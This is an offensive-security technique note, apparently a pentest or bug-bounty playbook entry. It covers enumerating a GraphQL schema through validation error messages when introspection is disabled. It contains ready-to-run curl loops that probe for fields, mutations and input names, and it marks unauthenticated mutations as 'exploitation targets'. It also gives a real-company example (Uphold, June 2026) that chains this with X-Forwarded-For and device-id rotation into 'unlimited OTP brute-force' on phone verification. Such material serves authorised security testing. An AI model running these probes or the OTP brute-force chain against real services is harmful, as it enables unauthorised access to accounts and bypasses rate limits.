# GraphQL Schema Enumeration via Error Messages (Introspection Bypass)

## Trigger
- GraphQL endpoint returns `{"data":{"__typename":"Query"}}` for `{__typename}` but blocks full introspection (returns HTML/403/error)
- Target has disabled introspection but left field-level validation errors enabled

## Technique

When GraphQL introspection is disabled, the schema can still be fully enumerated by exploiting validation error messages that reveal:
- Field names (via "Cannot query field X on type Y. Did you mean Z?")
- Required fields (via "Field X of required type Y! was not provided")
- Enum values (via "Enum X cannot represent non-enum value Y. Did you mean Z?")
- Type names (via "Expected value of type X, found Y")

### Step 1: Discover Query Fields
```bash
for field in "me" "user" "users" "account" "transaction" "node" "viewer"; do
  resp=$(curl -sk -X POST "$GQL_URL" -H "Content-Type: application/json" \
    -d "{\"query\":\"{${field}{id}}\"}" | head -c 100)
  if echo "$resp" | grep -q "Forbidden"; then
    echo "[EXISTS-403] $field"
  elif echo "$resp" | grep -q "argument"; then
    echo "[EXISTS-NEEDS-ARG] $field"
  elif ! echo "$resp" | grep -q "Cannot query"; then
    echo "[???] $field"
  fi
done
```

### Step 2: Discover Mutations
```bash
for mut in "createUser" "createTransaction" "verifyPhone" "resetPassword"; do
  resp=$(curl -sk -X POST "$GQL_URL" -H "Content-Type: application/json" \
    -d "{\"query\":\"mutation{${mut}(input:{}){id}}\"}")
  if ! echo "$resp" | grep -q "Cannot query field"; then
    echo "[EXISTS] $mut: ${resp:0:80}"
  fi
done
```

### Step 3: Enumerate Input Fields
```bash
# For each discovered mutation, try fields until error reveals valid ones
for field in "email" "password" "phone" "token" "id" "code"; do
  resp=$(curl -sk -X POST "$GQL_URL" -H "Content-Type: application/json" \
    -d "{\"query\":\"mutation{createUser(input:{${field}:\\\"test\\\"}){id}}\"}")
  if ! echo "$resp" | grep -q "not defined"; then
    echo "[VALID] $field"
  fi
done
```

### Step 4: Discover Enum Values
If a field requires an enum type, the error reveals valid values:
```
Input: type:"individual"
Error: Enum "UserType" cannot represent non-enum value: "individual". Did you mean the enum value "INDIVIDUAL"?
```

### Step 5: Exploit "Did you mean" Suggestions
Intentional typos trigger autocomplete-style suggestions:
```
Input: mutation{createPhone(input:{}){id}}
Error: Cannot query field "createPhone" on type "Mutation". Did you mean "createQuote", "createFile", "createUserPhone"?
```
This reveals mutation names you never guessed.

## Key Differentiation: Auth Behavior Analysis

Once fields are known, the critical insight is WHICH mutations process without auth:
- `403 Forbidden` = requires authentication
- `400 Bad Request` / `Validation Failed` = PROCESSES without auth (reaches business logic)

Mutations returning 400 are the exploitation targets — they validate input without checking auth first.

## Uphold Example (June 2026)
- `verifyPhone(input:{id, token})` → 400 "phoneFlowId invalid" (NO AUTH)
- `createUser(input:{country, email, password, type})` → 400 "Bad Request" (NO AUTH)
- `createTransaction(input:{quoteId})` → 403 (needs auth)
- Combined with X-Forwarded-For + device-id rotation = unlimited OTP brute-force

## Impact
- Full API schema disclosure (bypasses security control)
- Reveals internal field names (securityCode, otp, phoneFlowId)
- Identifies unauthenticated mutations for direct exploitation
